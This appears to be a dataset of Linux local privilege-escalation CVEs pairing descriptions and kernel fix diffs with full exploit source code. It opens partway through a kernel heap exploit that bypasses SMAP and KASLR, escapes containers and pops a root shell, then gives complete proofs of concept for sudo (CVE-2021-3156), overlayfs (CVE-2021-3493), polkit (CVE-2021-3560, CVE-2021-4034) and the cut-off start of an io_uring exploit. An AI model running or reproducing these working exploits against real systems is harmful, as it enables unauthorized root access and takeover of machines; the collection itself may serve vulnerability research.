  if (fake_idx == -1 && real_idx == -1) {
    printf(""[-] Error could not corrupt any primary message.\n"");
    goto err_no_rmid;
  }

  // fake_idx's primary message has a corrupted next pointer; wrongly
  // pointing to real_idx's secondary message.
  printf(""[+] fake_idx: %x\n"", fake_idx);
  printf(""[+] real_idx: %x\n"", real_idx);

  printf(""\n"");
  printf(""[+] STAGE 2: SMAP bypass\n"");

  printf(""[*] Freeing real secondary message...\n"");
  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
               MTYPE_SECONDARY) < 0)
    goto err_rmid;

  // Reclaim the previously freed secondary message with a fake msg_msg of
  // maximum possible size.
  printf(""[*] Spraying fake secondary messages...\n"");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                PAGE_SIZE - MSG_MSG_SIZE, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Use the fake secondary message to read out-of-bounds.
  printf(""[*] Leaking adjacent secondary message...\n"");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
    printf(""[-] Error could not leak adjacent secondary message.\n"");
    goto err_rmid;
  }

  // The secondary message contains a pointer to the primary message.
  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (PRIMARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;
  printf(""[+] kheap_addr: %"" PRIx64 ""\n"", kheap_addr);

  if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {
    printf(""[-] Error kernel heap address is incorrect.\n"");
    goto err_rmid;
  }

  printf(""[*] Freeing fake secondary messages...\n"");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at next to leak its content. Assumes zero bytes before
  // kheap_addr.
  printf(""[*] Spraying fake secondary messages...\n"");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Use the fake secondary message to read from kheap_addr.
  printf(""[*] Leaking primary message...\n"");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
    printf(""[-] Error could not leak primary message.\n"");
    goto err_rmid;
  }

  // The primary message contains a pointer to the secondary message.
  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (SECONDARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;

  // Calculate the address of the fake secondary message.
  kheap_addr -= SECONDARY_SIZE;
  printf(""[+] kheap_addr: %"" PRIx64 ""\n"", kheap_addr);

  if ((kheap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {
    printf(""[-] Error kernel heap address is incorrect.\n"");
    goto err_rmid;
  }

  printf(""\n"");
  printf(""[+] STAGE 3: KASLR bypass\n"");

  printf(""[*] Freeing fake secondary messages...\n"");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at m_list_next & m_list_prev so that list_del() is possible.
  printf(""[*] Spraying fake secondary messages...\n"");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  printf(""[*] Freeing sk_buff data buffer...\n"");
  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
    goto err_rmid;

  printf(""[*] Spraying pipe_buffer objects...\n"");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipefd[i]) < 0) {
      perror(""[-] pipe"");
      goto err_rmid;
    }
    // Write something to populate pipe_buffer.
    if (write(pipefd[i][1], ""pwn"", 3) < 0) {
      perror(""[-] write"");
      goto err_rmid;
    }
  }

  printf(""[*] Leaking and freeing pipe_buffer object...\n"");
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        perror(""[-] read"");
        goto err_rmid;
      }
      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
    }
  }

  kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
  printf(""[+] anon_pipe_buf_ops: %"" PRIx64 ""\n"", pipe_buffer_ops);
  printf(""[+] kbase_addr: %"" PRIx64 ""\n"", kbase_addr);

  if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {
    printf(""[-] Error kernel base address is incorrect.\n"");
    goto err_rmid;
  }

  printf(""\n"");
  printf(""[+] STAGE 4: Kernel code execution\n"");

  printf(""[*] Spraying fake pipe_buffer objects...\n"");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  buf = (struct pipe_buffer *)&secondary_buf;
  buf->ops = kheap_addr + 0x290;
  ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
#ifdef KERNEL_COS_5_4_89
  // RAX points to &buf->ops.
  // RCX points to &buf.
  ops->release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;
#elif KERNEL_UBUNTU_5_8_0_48
  // RSI points to &buf.
  ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
#endif
  build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Trigger pipe_release().
  printf(""[*] Releasing pipe_buffer objects...\n"");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (close(pipefd[i][0]) < 0) {
      perror(""[-] close"");
      goto err_rmid;
    }
    if (close(pipefd[i][1]) < 0) {
      perror(""[-] close"");
      goto err_rmid;
    }
  }

  printf(""[*] Checking for root...\n"");
  if ((fd = open(""/etc/shadow"", O_RDONLY)) < 0) {
    printf(""[-] Error could not gain root privileges.\n"");
    goto err_rmid;
  }
  close(fd);
  printf(""[+] Root privileges gained.\n"");

  printf(""\n"");
  printf(""[+] STAGE 5: Post-exploitation\n"");

  printf(""[*] Escaping container...\n"");
  setns(open(""/proc/1/ns/mnt"", O_RDONLY), 0);
  setns(open(""/proc/1/ns/pid"", O_RDONLY), 0);
  setns(open(""/proc/1/ns/net"", O_RDONLY), 0);

  printf(""[*] Cleaning up...\n"");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    // TODO: Fix next pointer.
    if (i == fake_idx)
      continue;
    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)
      perror(""[-] msgctl"");
  }
  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (close(ss[i][0]) < 0)
      perror(""[-] close"");
    if (close(ss[i][1]) < 0)
      perror(""[-] close"");
  }
  if (close(s) < 0)
    perror(""[-] close"");

  printf(""[*] Popping root shell...\n"");
  char *args[] = {""/bin/bash"", ""-i"", NULL};
  execve(args[0], args, NULL);

  return 0;

err_rmid:
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i == fake_idx)
      continue;
    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)
      perror(""[-] msgctl"");
  }

err_no_rmid:
  return 1;
}

",https://www.anquanke.com/post/id/254027,,,
CVE-2021-3156,https://www.opencve.io/cve/CVE-2021-3156,"Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via ""sudoedit -s"" and a command-line argument that ends with a single backslash character.",,,"/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512
#define SUDOEDIT_PATH ""/usr/bin/sudoedit""

typedef struct {
	char *target_name;
	char *sudoedit_path;
	uint32_t smash_len_a;
	uint32_t smash_len_b;
	uint32_t null_stomp_len;
	uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = ""Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27"",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = ""Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31"",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = ""Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28"",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    }
};

void usage(char *prog) {
    fprintf(stdout,
        ""  usage: %s <target>\n\n""
        ""  available targets:\n""
        ""  ------------------------------------------------------------\n"",
        prog
    );
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf(""    %d) %s\n"", i, targets[i].target_name);
    }
    fprintf(stdout,
        ""  ------------------------------------------------------------\n""
        ""\n""
        ""  manual mode:\n""
        ""    %s <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>\n""
        ""\n"",
        prog
    );
}

int main(int argc, char *argv[]) {
    printf(""\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n"");

    if (argc != 2 && argc != 5) {
        usage(argv[0]);
        return -1;
    }

    target_t *target = NULL;
    if (argc == 2) {
        int target_idx = atoi(argv[1]);

        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, ""invalid target index\n"");
            return -1;
        }

        target = &targets[ target_idx ];
    }  else {
        target = malloc(sizeof(target_t));
        target->target_name    = ""Manual"";
        target->sudoedit_path  = SUDOEDIT_PATH;
        target->smash_len_a    = atoi(argv[1]);
        target->smash_len_b    = atoi(argv[2]);
        target->null_stomp_len = atoi(argv[3]);
        target->lc_all_len     = atoi(argv[4]);
    }

    printf(
        ""using target: %s ['%s'] (%d, %d, %d, %d)\n"", 
        target->target_name,
        target->sudoedit_path,
        target->smash_len_a,
        target->smash_len_b,
        target->null_stomp_len,
        target->lc_all_len
    );

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        ""sudoedit"", ""-s"", smash_a, ""\\"", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = ""\\"";
    }
    s_envp[envp_pos++] = ""X/P0P_SH3LLZ_"";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, ""LC_ALL=C.UTF-8@"");
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf(""** pray for your rootshell.. **\n"");

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}

",https://github.com/blasty/CVE-2021-3156,,https://www.anquanke.com/post/id/231408#h2-1,
CVE-2021-3493,https://www.opencve.io/cve/CVE-2021-3493,"The overlayfs implementation in the linux kernel did not properly validate with respect to user namespaces the setting of file capabilities on files in an underlying file system. Due to the combination of unprivileged user namespaces along with a patch carried in the Ubuntu kernel to allow unprivileged overlay mounts, an attacker could use this to gain elevated privileges.","vfs: move cap_convert_nscap() call into vfs_setxattr()
cap_convert_nscap() does permission checking as well as conversion of the
xattr value conditionally based on fs's user-ns.

This is needed by overlayfs and probably other layered fs (ecryptfs) and is
what vfs_foo() is supposed to do anyway.

Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
Acked-by: James Morris <jamorris@linux.microsoft.com>
Diffstat
-rw-r--r--	fs/xattr.c	17	
-rw-r--r--	include/linux/capability.h	2	
-rw-r--r--	security/commoncap.c	3	
3 files changed, 13 insertions, 9 deletions
diff --git a/fs/xattr.c b/fs/xattr.c
index cd7a563e8bcd47..fd57153b1f6170 100644
--- a/fs/xattr.c
+++ b/fs/xattr.c
@@ -276,8 +276,16 @@vfs_setxattr(struct dentry *dentry, const char *name, const void *value,
  size_t size, int flags)
 {
 	struct inode *inode = dentry->d_inode;
 	struct inode *delegated_inode = NULL;
+	const void  *orig_value = value;
 	int error;
 
+	if (size && strcmp(name, XATTR_NAME_CAPS) == 0) {
+		error = cap_convert_nscap(dentry, &value, size);
+		if (error < 0)
+			return error;
+		size = error;
+	}
+
 retry_deleg:
 	inode_lock(inode);
 	error = __vfs_setxattr_locked(dentry, name, value, size, flags,
@@ -289,6 +297,9 @@ retry_deleg:
 		if (!error)
 			goto retry_deleg;
 	}
+	if (value != orig_value)
+		kfree(value);
+
 	return error;
 }
 EXPORT_SYMBOL_GPL(vfs_setxattr);
@@ -537,12 +548,6 @@ setxattr(struct dentry *d, const char __user *name, const void __user *value,
 		if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||
 		    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))
 			posix_acl_fix_xattr_from_user(kvalue, size);
-		else if (strcmp(kname, XATTR_NAME_CAPS) == 0) {
-			error = cap_convert_nscap(d, &kvalue, size);
-			if (error < 0)
-				goto out;
-			size = error;
-		}
 	}
 
 	error = vfs_setxattr(d, kname, kvalue, size, flags);
diff --git a/include/linux/capability.h b/include/linux/capability.h
index 1e7fe311cabe3b..b2f698915c0f3f 100644
--- a/include/linux/capability.h
+++ b/include/linux/capability.h
@@ -270,6 +270,6 @@ static inline bool checkpoint_restore_ns_capable(struct user_namespace *ns)
 /* audit system wants to get cap info from files as well */
 extern int get_vfs_caps_from_disk(const struct dentry *dentry, struct cpu_vfs_cap_data *cpu_caps);
 
-extern int cap_convert_nscap(struct dentry *dentry, void **ivalue, size_t size);
+extern int cap_convert_nscap(struct dentry *dentry, const void **ivalue, size_t size);
 
 #endif /* !_LINUX_CAPABILITY_H */
diff --git a/security/commoncap.c b/security/commoncap.c
index 59bf3c1674c8b4..bacc1111d871bc 100644
--- a/security/commoncap.c
+++ b/security/commoncap.c
@@ -473,7 +473,7 @@ static bool validheader(size_t size, const struct vfs_cap_data *cap)
  *
  * If all is ok, we return the new size, on error return < 0.
  */
-int cap_convert_nscap(struct dentry *dentry, void **ivalue, size_t size)
+int cap_convert_nscap(struct dentry *dentry, const void **ivalue, size_t size)
 {
 	struct vfs_ns_cap_data *nscap;
 	uid_t nsrootid;
@@ -516,7 +516,6 @@ int cap_convert_nscap(struct dentry *dentry, void **ivalue, size_t size)
 	nscap->magic_etc = cpu_to_le32(nsmagic);
 	memcpy(&nscap->data, &cap->data, sizeof(__le32) * 2 * VFS_CAP_U32);
 
-	kvfree(*ivalue);
 	*ivalue = nscap;
 	return newsize;
 }",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52,"#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    ""./ovlcap""
#define DIR_WORK    DIR_BASE ""/work""
#define DIR_LOWER   DIR_BASE ""/lower""
#define DIR_UPPER   DIR_BASE ""/upper""
#define DIR_MERGE   DIR_BASE ""/merge""
#define BIN_MERGE   DIR_MERGE ""/magic""
#define BIN_UPPER   DIR_UPPER ""/magic""


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, ""mkdir %s"", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, ""open %s"", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, ""write %s"", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, ""open %s"", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, ""open %s"", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, ""read %s"", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, ""write %s"", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, ""rm -rf '%s/'"", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, ""unshare"");

    xwritefile(""/proc/self/setgroups"", ""deny"");

    sprintf(buf, ""0 %d 1"", uid);
    xwritefile(""/proc/self/uid_map"", buf);

    sprintf(buf, ""0 %d 1"", gid);
    xwritefile(""/proc/self/gid_map"", buf);

    sprintf(buf, ""lowerdir=%s,upperdir=%s,workdir=%s"", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount(""overlay"", DIR_MERGE, ""overlay"", 0, buf) == -1)
        err(1, ""mount %s"", DIR_MERGE);

    // all+ep
    char cap[] = ""\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00"";

    xcopyfile(""/proc/self/exe"", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, ""security.capability"", cap, sizeof(cap) - 1, 0) == -1)
        err(1, ""setxattr %s"", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], ""magic"") || (argc > 1 && !strcmp(argv[1], ""shell""))) {
        setuid(0);
        setgid(0);
        execl(""/bin/bash"", ""/bin/bash"", ""--norc"", ""--noprofile"", ""-i"", NULL);
        err(1, ""execl /bin/bash"");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, ""fork"");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, ""shell"", NULL);
    err(1, ""execl %s"", BIN_UPPER);
}

",https://www.secpulse.com/archives/158063.html,,,
CVE-2021-3560,https://www.opencve.io/cve/CVE-2021-3560,"It was found that polkit could be tricked into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user. This flaw could be used by an unprivileged local attacker to, for example, create a new local administrator. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.",,,"// C based PoC for CVE-2021-3560 found by Kevin Backhouse
#include <dbus/dbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <pwd.h>
#include <sys/stat.h>
#include <time.h>


#define DEST ""org.freedesktop.Accounts""

#define PATH ""/org/freedesktop/Accounts""
#define INTERFACE ""org.freedesktop.Accounts""
#define METHOD ""CreateUser""

#define _PATH2 ""/org/freedesktop/Accounts/User%d""
#define INTERFACE2 ""org.freedesktop.Accounts.User""
#define METHOD2 ""SetPassword""

#define USER ""pwned-%d""
#define SHADOW_FILE ""/etc/shadow""

void create_user(char *, unsigned int);
void set_password(char *, unsigned int, unsigned int);
dbus_bool_t build_message(DBusMessage*, char *, int);
int is_empty_password_set(long int *);
void launch_shell(char *);
void print_error_and_exit();

DBusError dbus_error;

int main(int argc, char* argv[]) {
	char user[40];
	unsigned int uid = 1337;
	unsigned int delay = 0;
	unsigned int max_delay = 0;
	long int shadow_size = 0;
	int empty_password_set = 0;

	char * password = """"; // empty password
	struct passwd *passwd_user;
	
	sprintf(user, USER, (int)time(NULL));
	printf(""[*] creating \""%s\"" user ...\n"", user);

	do {
		if (fork() == 0) {
			create_user(user, delay);
		}
		wait(NULL);
		passwd_user = getpwnam(user);
	} while (passwd_user == NULL && ++delay);
	
	
	if (passwd_user == NULL) {
        	puts(""[!] seems the exploit didnt work, user not created, aborting ..."");
        	return 1;
	} else {
		uid = passwd_user->pw_uid;
		max_delay = delay + 1000;
		delay = 0;
	}
	
	puts(""[!] user has been created!"");
	printf(""[*] user: %s, uid: %d\n"", user, uid);
	printf(""[*] setting an empty password for \""%s\"" user..\n"", user);
		
	sleep(2); // accountsservice needs some time to recognize the new account, otherwise it will return ""no user""
	
	do {
		if (fork() == 0) {
			set_password(password, uid, delay);
		}
		++delay;
		wait(NULL);
		empty_password_set = is_empty_password_set(&shadow_size);
	} while (!empty_password_set && delay < max_delay);
	
	if (!empty_password_set) {
		printf(""[!] couldn't set an empty password for \""%s\"" user, try again!\n"", user);
		return 1;
	}
	
	printf(""[*] an empty password has been set for \""%s\"" user!\n"", user);
	printf(""[!] run: \""sudo su root\"" as \""%s\"" user to get root\n"", user);
	
	launch_shell(user);
	
	return 0;
} 

void create_user(char *user, unsigned int delay) {
	DBusConnection * dbus_connection;
	DBusMessage * dbus_message;
	
	unsigned int pid = getpid();
	
	dbus_error_init(&dbus_error);
	
        dbus_connection = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_error);
        if (!dbus_connection)
        	print_error_and_exit();


	dbus_message = dbus_message_new_method_call(NULL, PATH, INTERFACE, METHOD);
	if (!dbus_message)
		print_error_and_exit();
	
	if ( !dbus_message_set_destination(dbus_message, DEST) ) {
		fprintf(stderr, ""Error while setting destination: Out Of Memory\n"");
       	         exit(0);
	}
	
	if ( !build_message(dbus_message, user, 1) ) {
		fprintf(stderr, ""Error: while building message: Out Of Memory\n"");
                exit(0);
	}
	dbus_connection_flush(dbus_connection);
	dbus_connection_send_with_reply_and_block(dbus_connection, dbus_message, delay, &dbus_error);
	kill(pid, 9);
}

void set_password(char * password, unsigned int uid, unsigned int delay) {
	DBusConnection * dbus_connection;
	DBusMessage * dbus_message;
	
	char PATH2[40];
	sprintf(PATH2, _PATH2, uid);
	
	unsigned int pid = getpid();
	
	dbus_error_init(&dbus_error);
	
        dbus_connection = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_error);
        if (!dbus_connection)
        	print_error_and_exit();


	dbus_message = dbus_message_new_method_call(NULL, PATH2, INTERFACE2, METHOD2);
	if (!dbus_message)
		print_error_and_exit();
	
	if ( !dbus_message_set_destination(dbus_message, DEST) ) {
		fprintf(stderr, ""Error while setting destination: Out Of Memory\n"");
		exit(0);
	}
	
	if ( !build_message(dbus_message, password, 0) ) {
		fprintf(stderr, ""Error while building message: Out Of Memory\n"");
		exit(0);
	}

	dbus_connection_flush(dbus_connection);
	dbus_connection_send_with_reply_and_block(dbus_connection, dbus_message, delay, &dbus_error);
	kill(pid, 9);
}

dbus_bool_t build_message(DBusMessage* message, char *argument, int create_user) {
	DBusMessageIter arguments;
	dbus_bool_t success = 1;

	dbus_message_iter_init_append(message, &arguments);
	
   	success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &argument);
   	success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &argument);
   	if (create_user) {
   		int account_type = 1; // 0: standard user, 1: adminstrator user
   		success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_INT32, &account_type);
	}
	return success;
}

int is_empty_password_set(long int *shadow_size) {
	struct stat shadow_stat;
	int error;
	
	error = stat(SHADOW_FILE, &shadow_stat);
	if (error != 0) {
		puts(""[!] an error detected while checking the size of the shadow file!"");
		return 0;
	}
	if (*shadow_size == 0) {
		*shadow_size = shadow_stat.st_size;
	}
	
	return (shadow_stat.st_size == *shadow_size - 1);
}

void launch_shell(char *user) {
	char * cmd = ""/usr/bin/su"";
	char *args[3] = {""-"", user, NULL};
	
	execv(cmd, args);
}

void print_error_and_exit() {
	if (dbus_error_is_set(&dbus_error)) {
		fprintf(stderr, ""Error: %s\n"", dbus_error.message);
		dbus_error_free(&dbus_error);
		exit(1);
	}
	fprintf(stderr, ""Unknown error occured\n"");
	exit(1);
}

",https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation,,,
CVE-2021-4034,https://www.opencve.io/cve/CVE-2021-4034,A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.,,,"#include <unistd.h>

int main(int argc, char **argv)
{
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		""pwnkit.so:."",
		""PATH=GCONV_PATH=."",
		""SHELL=/lol/i/do/not/exists"",
		""CHARSET=PWNKIT"",
		""GIO_USE_VFS="",
		NULL
	};
	return execve(""/usr/bin/pkexec"", args, environ);
}",https://github.com/berdav/CVE-2021-4034,,,
CVE-2021-41073,https://www.opencve.io/cve/CVE-2021-41073,"loop_rw_iter in fs/io_uring.c in the Linux kernel 5.10 through 5.14.6 allows local users to gain privileges by using IORING_OP_PROVIDE_BUFFERS to trigger a free of a kernel buffer, as demonstrated by using /proc/<pid>/maps for exploitation.","io_uring: ensure symmetry in handling iter types in loop_rw_iter()
When setting up the next segment, we check what type the iter is and
handle it accordingly. However, when incrementing and processed amount
we do not, and both iter advance and addr/len are adjusted, regardless
of type. Split the increment side just like we do on the setup side.

Fixes: 4017eb91a9e7 (""io_uring: make loop_rw_iter() use original user supplied pointers"")
Cc: stable@vger.kernel.org
Reported-by: Valentina Palmiotti <vpalmiotti@gmail.com>
Reviewed-by: Pavel Begunkov <asml.silence@gmail.com>
Signed-off-by: Jens Axboe <axboe@kernel.dk>
Diffstat
-rw-r--r--	fs/io_uring.c	9	
1 files changed, 6 insertions, 3 deletions
diff --git a/fs/io_uring.c b/fs/io_uring.c
index 16fb7436043c27..66a7414c375688 100644
--- a/fs/io_uring.c
+++ b/fs/io_uring.c
@@ -3263,12 +3263,15 @@ static ssize_t loop_rw_iter(int rw, struct io_kiocb *req, struct iov_iter *iter)
 				ret = nr;
 			break;
 		}
+		if (!iov_iter_is_bvec(iter)) {
+			iov_iter_advance(iter, nr);
+		} else {
+			req->rw.len -= nr;
+			req->rw.addr += nr;
+		}
 		ret += nr;
 		if (nr != iovec.iov_len)
 			break;
-		req->rw.len -= nr;
-		req->rw.addr += nr;
-		iov_iter_advance(iter, nr);
 	}
 
 	return ret;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=16c8d2df7ec0eed31b7d3b61cb13206a7fb930cc,"#define _GNU_SOURCE   
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/poll.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <time.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>

#include ""bpf_defs.h""

#define PAGESIZE 4096

#define BPF_PROG_RUN_OFFSET      0xFE260

#define TASK_STRUCT_CRED_OFFSET  0x6E0
#define CRED_UID_OFFSET          0x4
#define CRED_EUID_OFFSET         0x14


#include ""liburing.h""


void* copy_map1 = NULL;
void* copy_map2 = NULL;
void* copy_map3 = NULL;
void* sleep_map1 = NULL;
void* sleep_map2 = NULL;
void* sleep_map3 = NULL;
void* block_map1 = NULL;

long task_struct_addr = 0;
int* upper_tsk = (int*)&task_struct_addr + 1;
int* lower_tsk = (int*)&task_struct_addr;
long bpf_prog_run32_addr = 0;
long fake_bpf_prog_addr = 0;

int procmaps_fd = -1;

struct io_uring ring = {0};

int group_id1 = 0x1337;
int group_id2 = 0x333;
char bufs1[4096][0x100] = {0};
char bufs2[4096][0x100] = {0};

pthread_mutex_t lock1 = {0};
pthread_mutex_t lock2 = {0};
pthread_mutex_t lock3 = {0};
pthread_mutex_t lock4 = {0};
pthread_mutex_t lock5 = {0};

int setup_fuse(void)
{
    int ret = -1;
    char* cmd = ""mkdir -p /tmp/fuse_mount && ./hello /tmp/fuse_mount"";
